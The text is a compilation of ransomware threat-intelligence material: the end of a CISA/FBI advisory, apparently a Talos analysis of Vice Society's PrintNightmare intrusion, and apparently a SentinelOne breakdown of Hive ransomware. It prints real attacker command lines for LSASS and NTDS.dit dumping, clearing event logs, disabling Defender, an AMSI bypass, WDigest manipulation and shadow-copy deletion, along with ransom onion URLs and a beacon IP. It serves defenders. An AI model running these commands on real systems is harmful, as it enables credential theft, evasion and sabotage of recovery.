Internet for tips on how to make a computer more secure before you reconnect it to\na network.)\nSecure your backups. Ensure that your backup data is offline and secure. If possible,\nscan your backup data with an antivirus program to check that it is free of malware.\nRefer to Joint Cybersecurity Advisory: AA20-245A: Technical Approaches to\nUncovering and Remediating Malicious Activity for more best practices on incident\nresponse.\n\nNote: CISA and the FBI do not encourage paying a ransom to criminal actors. Paying a\nransom may embolden adversaries to target additional organizations, encourage other\ncriminal actors to engage in the distribution of ransomware, and/or may fund illicit activities.\nPaying the ransom also does not guarantee that a victim’s files will be recovered. CISA and\nFBI urge you to report ransomware incidents to your local FBI field office.\n\nCISA offers a range of no-cost cyber hygiene services to help CI organizations assess,\nidentify and reduce their exposure to threats, including ransomware. By requesting these\nservices, organizations of any size could find ways to reduce their risk and mitigate attack\nvectors.\n\nResources\n\nCISA and MS-ISAC: Joint Ransomware Guide\nCISA: Ransomware page\nCISA Tip: Protecting Against Ransomware\nCISA: CISA Ransomware One-Pager and Technical Document\nCISA Insights: Ransomware Outbreak\nCISA: Pipeline Cybersecurity Initiative\nCISA Webinar: Combating Ransomware\nCISA: Cybersecurity Practices for Industrial Control Systems\nFBI: Incidents of Ransomware on the Rise\nNational Security Agency (NSA): Stop Malicious Cyber Activity Against Connected\nOperational Technology\nDepartment of Energy: Oil and Natural Gas Subsector Cybersecurity Capability\nMaturity Model\nTransportation Security Agency: Pipeline Security Guidelines\n\nhttps://us-cert.cisa.gov/ncas/tips/ST15-003\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-245a\nhttp://www.fbi.gov/contact-us/field\nhttps://www.cisa.gov/cyber-hygiene-services\nhttps://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf\nhttps://www.cisa.gov/ransomware\nhttps://us-cert.cisa.gov/ncas/tips/ST19-001\nhttps://www.us-cert.gov/sites/default/files/publications/Ransomware_Executive_One-Pager_and_Technical_Document-FINAL.pdf\nhttps://www.us-cert.gov/sites/default/files/2019-08/CISA_Insights-Ransomware_Outbreak_S508C.pdf\nhttps://www.cisa.gov/pipeline-cybersecurity-initiative\nhttps://www.youtube.com/watch?v=D8kC07tu27A\nhttps://www.cisa.gov/publication/cybersecurity-best-practices-for-industrial-control-systems\nhttps://www.fbi.gov/news/stories/incidents-of-ransomware-on-the-rise/incidents-of-ransomware-on-the-rise\nhttps://media.defense.gov/2021/Apr/29/2002630479/-1/-1/1/CSA_STOP-MCA-AGAINST-OT_UOO13672321.PDF\nhttps://www.energy.gov/sites/prod/files/2014/03/f13/ONG-C2M2-v1-1_cor.pdf\nhttps://www.tsa.gov/sites/default/files/pipeline_security_guidelines.pdf\n\n\n7/7\n\nNational Institute of Standards and Technology (NIST): Framework for Improving\nCritical Infrastructure Cybersecurity\nNIST: Ransomware Protection and Response\nNIST: Data Integrity: Identifying and Protecting Assets Against Ransomware and Other\nDestructive Events\nNIST: Data Integrity: Detecting and Responding to Ransomware and Other Destructive\nEvents\nNIST: Data Integrity: Recovering from Ransomware and Other Destructive Events\nNIST: Guide to Industrial Control Systems (ICS) Security\nSoftware Engineering Institute: Ransomware: Best Practices for Prevention and\nResponse\nNIST Fact Sheet: How Do I Stay Prepared?\n\nContact Information\n\nVictims of ransomware should report it immediately to CISA at https://us-cert.cisa.gov/report,\na local FBI Field Office, or U.S. Secret Service Field Office.

While previous research found that other threat actors had been\nexploiting this vulnerability, this appears to be new for the threat actor Vice Society.\n\nTalos Incident Response's research demonstrates that multiple, distinct threat actors view\nthis vulnerability as attractive to use during their attacks and may indicate that this\nvulnerability will continue to see more widespread adoption and incorporation by various\nadversaries moving forward. For defenders, it is important to understand the attack lifecycle\nleading up to the deployment of ransomware. If users have not already, they should\ndownload the latest patch for PrintNightmare from Microsoft.\n\nIn this post, we'll analyze the various TTPs used in a recent ransomware attack from Vice\nSociety that leveraged this vulnerability. Many of these same TTPs are commonly observed\nin other ransomware attacks, such as a previously published analysis of a WastedLocker\nattack.\n\nWho is Vice Society?\n\n \nVice Society is a relatively new player in the ransomware space. They emerged in mid-2021\nand have been observed launching big-game hunting and double-extortion attacks, primarily\ntargeting small or midsize victims.\n\nThis group also has notably targeted public school districts and other educational institutions.\nAs they are a new actor in this space, Vice Society's TTPs are difficult to quantify. However,\nbased on incident response observations, they are quick to leverage new vulnerabilities for\nlateral movement and persistence on a victim's network. They also attempt to be innovative\non end-point detection response bypasses.\n\nAs with other threat actors operating in the big-game hunting space, Vice Society operates a\ndata leak site, which they use to publish data exfiltrated from victims who do not choose to\npay their extortion demands. Below is an example screenshot of this site.\n\nhttps://www.bleepingcomputer.com/news/security/ransomware-gang-uses-printnightmare-to-breach-windows-servers/\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527\nhttps://www.databreaches.net/frederick-public-schools-in-oklahoma-back-up-and-running-after-ransomware-attack/\n\n\n3/11\n\n \n\nRecent attack methodology\n\n \nThroughout the course of our analysis of a recent human-operated ransomware attack\nassociated with Vice Society, we observed several notable tactics, techniques, and\nprocedures (TTPs) used throughout each stage of the attack lifecycle. Some of the most\ninteresting characteristics of this attack were:\n\nThe use of utilities such as proxychains and impacket during the post-compromise\nphases of the attack lifecycle.\nThe targeting of backups to prevent recovery following ransomware deployment.\nThe degradation of ESXi servers used for virtualization in victim environments.\nThe use of a DLL that takes advantage of the recently discovered PrintNightmare\nvulnerability for which Microsoft has previously released a security update.\nAttempts to bypass native Windows protections for credential theft and privilege\nescalation.\n\nhttps://1.bp.blogspot.com/-yURLrS8VNZ8/YRWbIFT8cGI/AAAAAAAACBI/aSywEVmezMY7qof06GeEvqsJv8HgyDdVQCLcBGAsYHQ/s806/image4.png\n\n\n4/11\n\nBelow are some key examples of the TTPs used in this attack as they relate to the Mitre\nATT&CK Framework.\n\nDiscovery\n\n \nATT&CK Technique: System Owner/User Discovery (T1033)\n\n ATT&CK Technique: Account Discovery (T1087)\n ATT&CK Technique: Domain Trust Discovery (T1482)\n\nOnce initial access was achieved, several techniques were observed being leveraged to\nconduct post-compromise discovery and reconnaissance within the environment. We\nobserved attempts to access the backup solution employed in the environment, likely to\nprevent the organization from successfully recovering without paying the demanded ransom.\nThe \"sudo\" command was used to obtain credentials associated with a commercial backup\nsolution, likely trying to gain access to backups present within the environment.\n\n \nsudo -s -k -p [Backup Prompt] whoami\n\nWe also observed the use of impacket, a common network protocol manipulation tool to\nenumerate the environment and obtain additional information about the Active Directory\nconfiguration in place. This is typically done to identify high-value targets that may be\nattractive, as attacks attempt to maximize their sphere of influence over as much of the\nenvironment as possible prior, eventually deploying ransomware and making their presence\nknown. Below are some examples of the command line syntax used for the performance of\nthis activity.\n\n \ncmd.exe /q /c net group enterprise admins /domain 1> \\\\127.0.0.1\\admin$\\__[STIRNG] \n2>&1\n\ncmd.exe /q /c net group domain admins /domain 1> \\\\127.0.0.1\\admin$\\__[STRING] 2>&1 \n\nWe observed enumeration of the domain trust relationships present within the environment.\nThe adversaries used the \"nltest\" command for this purpose. \n\n \nc:\\windows\\system32\\nltest.exe /dclist:linux [HOSTNAME]\n\n \n\nExecution\n\n \nATT&CK Technique: Command and Scripting Interpreter: Windows Command Shell\n(T1059.003)\n\n ATT&CK Technique: Command and Scripting Interpreter: PowerShell (T1059.001)\n ATT&CK Technique: Windows Management Instrumentation (T1047)\n\n ATT&CK Technique: System Services: Service Execution (T1569.002)\n\nhttps://attack.mitre.org/\nhttps://attack.mitre.org/techniques/T1033/\nhttps://attack.mitre.org/techniques/T1087/\nhttps://attack.mitre.org/techniques/T1482/\nhttps://attack.mitre.org/techniques/T1059/003/\nhttps://attack.mitre.org/techniques/T1059/001/\nhttps://attack.mitre.org/techniques/T1047/\nhttps://attack.mitre.org/techniques/T1569/002/\n\n\n5/11\n\nSimilar to what was observed during the post-compromise reconnaissance phase of the\nattack, the adversary used impacket to execute Windows Management Instrumentation\n(WMI) to achieve command execution on other systems present in the environment. The\nattacker also used the \"proxychains\" utility, which is often employed to redirect network traffic\nduring penetration testing, red teaming, and other offensive operations. \n\ncmd.exe /q /c proxychains ~/impacket/examples/wmiexec.py -hashes [SHA256 HASH] \n[USERNAME]@[IP ADDRESS] 1> \\\\127.0.0.1\\admin$\\__[STRING] 2>&1\n\nWe also observed the adversary using Windows Batch files to execute PSExec. In this case,\nPSExec remotely authenticated and executed PowerShell on remote systems within the\nenvironment. \n\ncmd.exe /c C:\\s$\\0.bat PsExec.exe -d \\\\[HOSTNAME] -u [DOMAIN]\\[USERNAME] -p \n[PASSWORD] -accepteula -s cmd /c powershell.exe -ExecutionPolicy Bypass -file \\\\\n[HOSTNAME]\\s$\\p.ps1 \n\nThere were also artifacts in the environment that indicate that the recently disclosed\nPrintNightmare vulnerability may have been used during this attack. A DLL associated with\nPrintNightmare was observed on systems within the environment as described in the section\n\"Credential Access.\"\n\nPersistence\n\n \nATT&CK Technique: Create or Modify System Process (T1543)\n\nIn many big-game hunting ransomware attacks, upon achieving initial access into the target\nenvironment, the adversary will first attempt to achieve persistence so that they can regain\naccess to the environment if they are detected or their initial point of access is otherwise\nremoved. In this particular case, we observed the adversary leveraging a Windows Service\nto execute PowerShell to stay persistent in the environment.\n\nThe Windows service was configured with the following options:\n\nService Type: user mode service \n Service Start Type: demand start \n Service Account: LocalSystem \n\n Service Name: Updater\n\nService Filename:\n\n%COMSPEC% /C start /b %WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -\nw 1 -enc [BASE64 ENCODED BLOB]\n\nAs can be seen above, the PowerShell being executed was Base64 encoded. The decoded\nPowerShell instructions are below:\n\n \n\nhttps://blog.talosintelligence.com/2021/07/printnightmare-coverage.html\nhttps://attack.mitre.org/techniques/T1543/\n\n\n6/11\n\nThis PowerShell is responsible for the performing the following tasks:\nDisabling PowerShell logging.\nBypassing AMSI protection for PowerShell.\nDownloading, decrypting, and executing a backdoor payload from an attacker-\ncontrolled server.\n\nBy implementing this persistence, the attacker can regain access to the environment if the\ntargeted organization destroys their initial means of access.\n\nLateral movement\n\n \nATT&CK Technique: Remote Services (T1021)\n\n ATT&CK Technique: Lateral Tool Transfer (T1570)\n\nOnce operational within the target environment, attackers will typically perform\nreconnaissance, identifying additional target systems, and then move laterally from system to\nsystem as they attempt to escalate privileges and then, ultimately, deploy ransomware on\nmany systems in the environment. During the investigation, we observed the attacker\nleveraging Windows Remote Desktop Connections to pivot to additional systems in the\nenvironment. This was typically performed via the following command-line syntax:\n\n \nC:\\Windows\\system32\\mstsc.exe /v [HOSTNAME]\n\nThe attacker also attempted to execute PowerShell scripts on remote systems in the\nenvironment while moving system-to-system. \n\n \ncmd /c powershell.exe -ExecutionPolicy Bypass -file \\[IPADDRESS]\\share$\\p.ps1 \n\nDuring the attack, adversaries copied and executed the aforementioned PowerShell script on\nmultiple systems across the environment.\n\nCredential access\n\nhttps://1.bp.blogspot.com/-8r-Pt_X6hck/YRWbyZXoW5I/AAAAAAAACBQ/jMxUxJcgbq4cIFMjjJ2LtmYMIiXv5WfDgCLcBGAsYHQ/s1999/image2.png\nhttps://attack.mitre.org/techniques/T1021/\nhttps://attack.mitre.org/techniques/T1570/\n\n\n7/11\n\n \nATT&CK Technique: OS Credential Dumping (T1003)\nATT&CK Technique: OS Credential Dumping: LSASS Memory (T1003.001)\n\nThe actor attempted to extract credentials from the victim in two ways: Accessing the active\ndirectory global catalog file ntds.dit and utilizing comsvcs.dll. Comsvcs.dll is a well-known\nway to extract LSASS (Local Security Authority Subsystem Service) data. By invoking\ncomsvcs.dll with rundll32.exe, an adversary can create a dump of any process. This is a\nclassic and clever living-off-the-land binary (LoLBin) tactic that avoids popular credential\nextraction tools like Mimikatz, which may alert defenders.\n\nWe also observed attempts to dump the NTDS.dit, which is a database of Active Directory\ninformation. Examples of the command-line syntax used in these cases are below.\n\ncmd.exe /q /c powershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q 1> \n\\\\127.0.0.1\\admin$\\__[STRING] 2>&1\n\ncmd.exe /q /c powershell ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp_logs' q \nq 1> \\\\127.0.0.1\\admin$\\__[STRING]5 2>&1\n\nThe actor also utilized PrintNightmare, a recently published series of vulnerabilities by\nMicrosoft that would allow remote code execution when an improper print spooler performs\nprivileged file operations. This attack vector is notable in the ubiquitous nature of print\nservices in all modern corporate enterprises. Microsoft has recently released a security patch\nfor PrintNightmare — we encourage all enterprises to patch immediately to avoid\nexploitation.\n\nDefense evasion\n\n \nATT&CK Technique: Indicator Removal on Host: Clear Windows Event Logs (T1070.001)\n\n ATT&CK Technique: Modify Registry (T1112)\n ATT&CK Technique: Impair Defenses or Modify Tools (T1562.001)\n\nThroughout the attack, the adversary made multiple attempts to evade detection and subvert\nsecurity controls in place as described throughout previous sections of this blog post. We\nalso observed the attacker attempting to clear the contents of security logs on compromised\nsystems. The following command-line syntax was observed being used to clear the System,\nSecurity and Application Windows Event Logs. \n\n \nc:\\windows\\system32\\wevtutil.exe cl system\n\nc:\\windows\\system32\\wevtutil.exe cl security\n\nc:\\windows\\system32\\wevtutil.exe cl application\n\nhttps://attack.mitre.org/techniques/T1003/\nhttps://attack.mitre.org/techniques/T1003/001/\nhttps://blog.talosintelligence.com/2019/11/hunting-for-lolbins.html\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527\nhttps://msrc-blog.microsoft.com/2021/08/10/point-and-print-default-behavior-change/\nhttps://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872\nhttps://attack.mitre.org/techniques/T1070/001/\nhttps://attack.mitre.org/techniques/T1112/\nhttps://attack.mitre.org/techniques/T1562/001/\n\n\n8/11\n\nThe adversary was also observed remotely modifying the Windows Registry on remote\nsystems to disable remote administration restrictions to facilitate lateral movement and\nprivilege escalation activities. Disabling this security control allows attackers to leverage\npass-the-hash attacks and hinder RDP's security on systems.\n\ncmd.exe /q /c powershell new-itemproperty -path \nhklm:\\system\\currentcontrolset\\control\\lsa -name disablerestrictedadmin -value 0 -\npropertytype dword -force 1> \\\\127.0.0.1\\admin$\\__[STRING] 2>&1 \n\nWe also observed the attacker disabling Windows Defender by modifying the Windows\nRegistry on compromised systems. This was performed using the following commands:\n\nC:\\Windows\\system32\\reg.exe delete HKLM\\Software\\Policies\\Microsoft\\Windows Defender \n/f\n\nC:\\Windows\\system32\\reg.exe add HKLM\\Software\\Policies\\Microsoft\\Windows \nDefender\\Real-Time Protection /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f \n\nC:\\Windows\\system32\\reg.exe add HKLM\\Software\\Policies\\Microsoft\\Windows \nDefender\\SpyNet /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f \n\nWe also observed the threat actor attempting to evade detection while enumerating the\nenvironment using an AMSI bypass, which is often used as a way to evade detection by\nendpoint security solutions that may be present on compromised systems. In this case, the\nWindows Command Processor was used to invoke PowerShell, which then leveraged\nInvoke-Expression (IEX) for this purpose.\n\ncmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C IEX \n([Net.ServicePointManager]::ServerCertificateValidationCallback=\n{$true}try{[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'i\n\nExfiltration\n\n \nATT&CK Technique: Exfiltration Over Alternative Protocol (T1048)\n\nOver the past couple of years, we have observed an increasing number of ransomware\nthreat actors adopting a double-extortion methodology in their attacks. In these attacks,\nadversaries attempt to exfiltrate large quantities of sensitive information for the purposes of\nfurther extortion against victims. This data, once exfiltrated, is published to attacker-\ncontrolled websites that are commonly referred to as \"data leak sites\" in situations where the\nvictim chooses not to pay the ransom demand.\n\nIn this attack, we observed the adversary attempting to exfiltrate sensitive information over\nSMB (TCP/445) directly from a compromised domain controller. This was likely chosen as a\nway to bypass egress filtering that may have been in place at the perimeter of the victim\nenvironment.\n\nhttps://www.stigviewer.com/stig/windows_paw/2017-11-21/finding/V-78161\nhttps://attack.mitre.org/techniques/T1048/\n\n\n9/11\n\nDefender takeaways\n\n \nIt can be difficult to account for the myriad ways an attacker can compromise and inflict\nmalware on a network. Given the techniques demonstrated here, it can feel overwhelming as\na defender to account for every avenue of attack. The good news is that there are several\nlessons we can learn about this incident: \n\n Logging is critical for forensics — ensure there is reliable and secure logging\ninfrastructure in place.\nUtilize multi-factor authentication to make credential theft more difficult to exploit.\nLook at egress filtering for firewalls and ensure malicious traffic cannot call out to\nadversary infrastructure.\nUtilize an endpoint detection response platform that detects LoLBin abuse and\nmalware implants.\nKeep up-to-date and offline backups that cannot be targeted by adversaries.\n\n \n\nConclusion\n\n \nAs demonstrated throughout this post, attackers often make use of a variety of tactics,\ntechniques, and procedures as they work to accomplish their mission objectives. In some\ninstances, there is significant overlap and similarities between the approaches taken by\ndistinct threat actors. They often leverage dual-use tools for various purposes to minimize\ntheir footprint and evade detection. Likewise, adversaries are constantly refining their\napproach to the ransomware attack lifecycle as they strive to operate more effectively,\nefficiently, and evasively. The use of the vulnerability known as PrintNightmare shows that\nadversaries are paying close attention and will quickly incorporate new tools that they find\nuseful for various purposes during their attacks. Multiple distinct threat actors are now taking\nadvantage of PrintNightmare, and this adoption will likely continue to increase as long as it is\neffective. It is important that defenders be aware of the various TTPs being used throughout\nthe attack lifecycle so that they are prepared to prevent, detect, and respond to nefarious\nactivity that may be indicative of a successful compromise of their environment. Failure to do\nso could result in widespread operational disruption, reputational damage, and the loss of\nconfidentiality of sensitive information. \n\nCoverage\n\n \nWays our customers can detect and block this threat are listed below.\n\n \n\nhttps://youtu.be/3OzHRTImA1U\n\n\n10/11\n\nCisco Secure Endpoint is ideally suited to prevent the execution of the malware detailed in\nthis post.

On August 15,\n2021, news broke of a Hive campaign against Memorial Health System, an Ohio healthcare\nprovider. As a result, the hospital was forced to advise some patients to seek treatment at\nseparate facilities.\n\nWhile some ransomware attacks hitting public health and critical infrastructure targets can be\nthe result of a shotgun approach to targetting – mass phishing campaigns that execute\nmalware blindly on victim devices without awareness of the victim environment – that is not\nthe case with Hive. This is a human-operated ransomware attack designed to take input from\nthe command line, indicating the attackers are both aware of the environment and tailoring\ntheir attacks for maximum impact.\n\nMemorial Health Systems open statement on ransomware attack\n\nWho is Hive?\n\nHive or “HiveLeaks” is a relatively new ransomware outfit that made its appearance on the\nscene in late June, 2021. Hive is yet another double extortion group, making their money off\nof a two-pronged attack: exfiltrating sensitive data before locking up the victims’ systems.\nThis allows them to pressure the victim into paying greater sums than a conventional\nransomware attack as they also face the threat of a mass leak of sensitive data. Hive’s\nschemes have proven successful so far as multiple leaks are currently posted on their victim\nblog. As of the time of writing, there are 30 companies currently named on the HiveLeaks\nsite.\n\nhttps://www.sentinelone.com/lp/covid-19/\nhttps://mhsystem.org/cyberattack\n\n\n3/10\n\nHiveLeaks site showing the timer before releasing victim files\nWe can’t put the toothpaste back in the tube for Memorial Health Systems, but we can at\nleast contribute a breakdown of the Hive operators’ preferred techniques and a deep dive\ninto their ransomware toolkit to help other potential victims.\n\nTechnical Analysis\n\nInitial acces can vary. Cobalt Strike implants are most often the tool of choice. They are\ndelivered via phishing or emails in order to establish initial access. These beacons maintain\npersistence and allow the operators to expand their reach within the compromised\nenvironment. They are also used to launch the Hive payloads.\n\nRecent campaigns opt for the use of ConnectWise. ConnectWise is a legitimate commercial\nremote administration tool that has been abused by multiple ransomware operators in recent\nyears. This allows for persistence and management of their malware in environments where\nCobalt Strike hasn’t been successful.\n\nOnce inside, attackers will attempt to dump credentials by way of consvcs.dll  (MinDump)\nthough rundll32.exe :\n\nWindowssystem32cmd.exe /C rundll32.exe \nWindowsSystem32comsvcs.dll MinDump 752 lsass.dmp full \n\n\n\n4/10\n\nAdditionally, WDigest  may be manipulated to allow for the caching of cleartext credential\ndata:\n\nWindowssystem32cmd.exe /C reg add \nHKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v \nUseLogonCredential /t REG_DWORD /d 1 && gpupdate /force \n\nAdditional tools like ADRecon may be used to further understand and traverse the\ncompromised Active Directory (AD) environment. ADRecon is an open-source tool designed\nto do just that– to map, traverse and enumerate an AD environment.\n\nThe Hive Payload\n\nWhile the tools, techniques, and procedures mentioned above are fairly standard for\nransomware groups these days, Hive utilizes their own closed-source ransomware. The\npayloads are written in Go and packed with UPX. After unpacking, the ransomware itself is\nover 2MB in size owing to the way Go packages statically-link all dependencies to create a\nreliably portable executable.\n\nThe developers are taking advantage of some of the native benefits of Go, particularly the\nability to implement easy and reliable concurrency. On the other hand, Go is known for\nenabling easy cross-compilation across different operating systems but the manner in which\nHive implements its functionality makes it Windows-specific, at this time.\n\nThe ransomware is designed to take input from the command line, indicating that it’s meant\nto be run directly by an operator or a script containing the desired parameters. The available\nflags are as follows.\n\nFlags used by Hive Ransomware\nThese flags are largely self-explanatory with the exception of the final option, no-\ncleanpollDesc. This refers to a final phase in the ransomware’s functionality that looks for a\nfile named swap.tmp  in all logical drives and deletes it before the ransomware exits. The\n\nhttps://github.com/adrecon/ADRecon\n\n\n5/10\n\ndevelopers refer to this as ‘cleaning space’. At this time we don’t know what this file does,\nwhether it’s a component generated during their operations, a native Windows file, or\nperhaps a reference to incomplete cross-platform functionality intended for future builds.\n\nGo malware is usually considered difficult to reverse engineer, primarily due to the wealth of\ntangentially-related imported code baked into every executable. It’s important to isolate the\ncode contributed by the malware developers. In this case, Hive devs contributed four\npackages orchestrated by the main()  function: encryptor, keys, winutils, and config.\n\nCustom packages under ‘google.com’\n\nparent directory\nCursory examination might miss these as they’re housed under a parent package named\ngoogle.com, perhaps to give the appearance that these are standard packages.\n\nThe main function parses the flags provided by the operator and before initializing the\nransomware functionality under encryptor.NewApp() . First it generates and exports the\nencryption keys and generates the ransom note. It directs the victim to a password-protected\nOnion domain:\n\nhttp://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/ \n\nIt also warns the victim of the impending disclosure of their stolen data at the Hive Leaks\nsite:\n\nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc<redacted>.onion/ \n\nThe main functionally is housed under encryptor.(*App).Run() , which does the\nfollowing:\n\n1. App.ExportKeys()  wraps around standard go crypto functions, which it uses to\ngenerate RSA keys. A key file is exported.\n\n2. MountPoints()  enumerates different types of drives and appends them to a slice (a\ndynamically-sized array in Go). This includes native logical drives, removable drives,\nand remote shares.\n\n\n\n6/10\n\n3. Based on the kill flag, the malware proceeds to kill processes matching the regex\nprovided. If no custom value is provided, the following default is used:\n\n\"bmr|sql|oracle|postgres|redis|vss|backup|sstp\" \n\n4. Based on the stop flag, the malware connects to the Windows service control manager\nand proceeds to stop services matching the regex provided.\n\n5. The malware creates a batch file to self-delete with the filename hive.bat , removing\nits own components from the disk via a new process.\n\ntimeout 1 || sleep 1 \ndel \"C:Usersadmin1Desktophmod4.exe\" \nif exist \"C:Usersadmin1Desktophmod4.exe\" goto Repeat \ndel \"hive.bat\" \n\n6. It creates a batch file to delete shadow copies under the filename shadow.bat  and\nexecutes it as a separate process.\n\nvssadmin.exe delete shadows /all /quiet \ndel shadow.bat \n\n7. In order to take advantage of Go’s concurrency features, the Hive devs run a\nNotify()  function that is meant to watch the WaitGroup  that keeps track of the\n\nparallel threads. As long as there are threads pending, this function will keep the\nprogram running.\n\n8. Now onto the real business of ransomware. ScanFiles()  will populate a list of\nabsolute filepaths fed into a channel (a queue of sorts). EncryptFiles()  will then\nspawn threads that each take a file from that queue and encrypt it. This concurrency\nfeature is the main advantage of writing this ransomware in Go and allows for much\nfaster file encryption.\n\n9. Finally, the devs make sure to erase the encryption key from memory.\n\nRansom notes are deposited into each folder containing encrypted files (skipping the\nC:windows ) directory.\n\n\n\n7/10\n\nThe ‘HOW_TO_DECRYPT.TXT’ ransom note\nThe ransom note instructs victims to visit the Hive portal via TOR and login with their\nassigned unique ID to continue the payment process.\n\nHive Victim Portal\n\nEach infection campaign is assigned unique credentials available in the ransom note. This\nportal leads the victim to the standard ransomware ‘support’ area where they can upload\nfreebie test files, communicate with their attackers, and receive their decryptor should they\nchoose to pay (which, in an ideal world, they shouldn’t).\n\nhttps://assets.sentinelone.com/biden-exec-order/sentinel-one-ransomw-2\n\n\n8/10\n\nWatch Video At:\n\nhttps://youtu.be/MEi0QWuyLtw\n\nConclusion\n\nAs these attacks continue to escalate and become more egregious, the need for true attack\n‘prevention’ is all the more critical. While well-maintained and tested backup strategies are a\nmust, they are not enough in these double-extortion cases.\n\nOnce executed, most modern ransomware will go after backup and storage volumes in fairly\nsmart ways. Many have even evolved to target specific NAS devices and platforms. Some\ngroups will bypass the encryption phase altogether and opt for pilfering data to openly extort\nvictims with. While the latter scenario may seem preferable due to a lack of disruption, the\nreputational damage, potential liability, and threat to business viability remains. Hence our\nemphasis on prevention.\n\nWe urge all defenders to explore and embrace modern endpoint protection technologies that\ngo beyond static checks, basic signatures, and other outdated components. Contextual\nawareness and automated behavioral classification are among the most powerful weapons\ndefenders should avail themselves of.\n\nIndicators of Compromise\n\nFILE HASHES\n\nSHA1\n 67f0c8d81aefcfc5943b31d695972194ac15e9f2\n\n edba1b73ddd0e32784ae21844c940d7850531b82\n\nhttps://youtu.be/MEi0QWuyLtw\nhttps://www.sentinelone.com/blog/meet-darkside-and-their-ransomware-sentinelone-customers-protected/\n\n\n9/10\n\n2877b32518445c09418849eb8fb913ed73d7b8fb\ncd8e4372620930876c71ba0a24e2b0e17dcd87c9\neaa2e1e2cb6c7b6ec405ffdf204999853ebbd54a\n0f9484948fdd1b05bad387b14b27dc702c2c09ed\ne3e8e28a70cdfa2164ece51ff377879a5151abdf\n9d336b8911c8ffd7cc809e31d5b53796bb0cc7bb\n1cc80ad88a022c429f8285d871f48529c6484734\n3b40dbdc418d2d5de5f552a054a32bfbac18c5cc\n2f3273e5b6739b844fe33f7310476afb971956dd\n7777771aec887896be773c32200515a50e08112a\n5dbe3713b309e6ecc208e2a6c038aeb1762340d4\n480db5652124d4dd199bc8e775539684a19f1f24\nDc0ae41192272fda884a1a2589fe31d604d75af2\n\nHive.bat\nC9471adc8db180a7da5a56966b156b440483856f\n\nShadow.bat\n4714f1e6bb75a80a8faf69434726d176b70d7bd8\n\nSHA256\na0b4e3d7e4cd20d25ad2f92be954b95eea44f8f1944118a3194295c5677db749\n50ad0e6e9dc72d10579c20bb436f09eeaa7bfdbcb5747a2590af667823e85609\n5ae51e30817c0d08d03f120539aedc31d094b080eb70c0691bbfbaa4ec265ef3\n77a398c870ad4904d06d455c9249e7864ac92dda877e288e5718b3c8d9fc6618\ne1a7ddbf735d5c1cb9097d7614840c00e5c4d5107fa687c0ab2a2ec8948ef84e\ned614cba30f26f90815c28e189340843fab0fe7ebe71bb9b4a3cb7c78ff8e3d2\nc5fe23c626413a18cba8fb4ea93df81529c85f470577fb9c2336d6b692689d9d\n88f7544a29a2ceb175a135d9fa221cbfd3e8c71f32dd6b09399717f85ea9afd1\n2f7d37c22e6199d1496f307c676223dda999c136ece4f2748975169b4a48afe5\nfdbc66ebe7af710e15946e1541e2e81ddfd62aa3b35339288a9a244fb56a74cf\n1e21c8e27a97de1796ca47a9613477cf7aec335a783469c5ca3a09d4f07db0ff\nbf7bc94506eb72daec1d310ba038d9c3b115f145594fd271b80fbe911a8f3964\nc04509c1b80c129a7486119436c9ada5b0505358e97c1508b2cfb5c2a177ed11\n612e5ffd09ca30ca9488d802594efb5d41c360f7a439df4ae09b14bce45575ec\n0df750bf15895d410c3f6ce45279ab0329c5c723af38b99aadc9a60bcdc9a71d\n5954558d43884da2c7902ddf89c0cf7cd5bf162d6feefe5ce7d15b16767a27e5\n\nHive.bat\n93852dbd3a977cf2662b0c4db26b627736ba51c0df627eb36b41fdbde093c3c3\n\nShadow.bat\nD158f9d53e7c37eadd3b5cc1b82d095f61484e47eda2c36d9d35f31c0b4d3ff8\n\n\n\n10/10\n\nCOMMUNICATIONS\n\nCobalt Beacon: 176.123.8.228\n\nMITRE ATT&CK\n\nT1574.001 – Hijack Execution Flow: DLL Search Order Hijacking\n TA0005 – Defense Evasion\n\n TA0004 – Privilege Escalation\n T1486 – Data Encrypted for Impact\n\n T1027.002 – Obfuscated Files or Information: Software Packing\n T1003.001 – OS Credential Dumping: LSASS Memory\n\n T1007 – System Service Discovery\n T1059 – Command and Scripting Interpreter\n\n T1059.001 – Command and Scripting Interpreter: PowerShell\n T1059.003 – Command and Scripting Interpreter: Windows Command Shell\n\n T1490 – Inhibit System Recovery\n\nhttps://attack.mitre.org/techniques/T1574/001/\nhttps://attack.mitre.org/tactics/TA0005/\nhttps://attack.mitre.org/tactics/TA0004/\nhttps://attack.mitre.org/techniques/T1486/\nhttps://attack.mitre.org/techniques/T1027/002/\nhttps://attack.mitre.org/techniques/T1003/001/\nhttps://attack.mitre.org/techniques/T1007/\nhttps://attack.mitre.org/techniques/T1059/\nhttps://attack.mitre.org/techniques/T1059/001/\nhttps://attack.mitre.org/techniques/T1059/003/\nhttps://attack.mitre.org/techniques/T1490/",

